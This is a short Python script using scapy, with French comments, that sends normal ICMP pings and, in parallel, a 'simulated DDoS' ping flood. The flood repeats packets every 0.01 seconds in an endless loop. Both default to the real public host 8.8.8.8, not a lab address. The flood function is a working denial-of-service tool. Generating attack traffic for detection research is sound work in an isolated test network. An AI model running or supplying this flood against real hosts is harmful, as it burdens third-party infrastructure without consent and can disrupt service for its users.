from scapy.all import *
import time
import random

def generate_normal_traffic(destination_ip="8.8.8.8"):
    while True:
        # Créer un paquet ICMP (ping)
        packet = IP(dst=destination_ip)/ICMP()

        # Envoyer le paquet
        send(packet)

        # Attendre pendant une période de temps normale (en secondes)
        time.sleep(random.uniform(0.5, 2))

def simulate_ddos_attack(destination_ip="8.8.8.8"):
    while True:
        # Créer un paquet ICMP (ping) pour une attaque DDoS (ping flood)
        packet = IP(dst=destination_ip)/ICMP(type=8, code=0)

        # Envoyer le paquet
        send(packet, loop=True, inter=0.01)  # Envoi en boucle avec un intervalle très court

def stop_sniffing(signal, frame):
    print("CTRL+C detected. Stopping traffic...")
    exit(0)


def main():
    import signal
    signal.signal(signal.SIGINT, stop_sniffing)
    destination_ip = "8.8.8.8"

    # Générer du trafic normal en parallèle avec la simulation d'attaque DDoS
    normal_traffic_thread = threading.Thread(target=generate_normal_traffic, args=(destination_ip,))
    ddos_attack_thread = threading.Thread(target=simulate_ddos_attack, args=(destination_ip,))

    normal_traffic_thread.start()
    ddos_attack_thread.start()

    normal_traffic_thread.join()
    ddos_attack_thread.join()

if __name__ == "__main__":
    main()
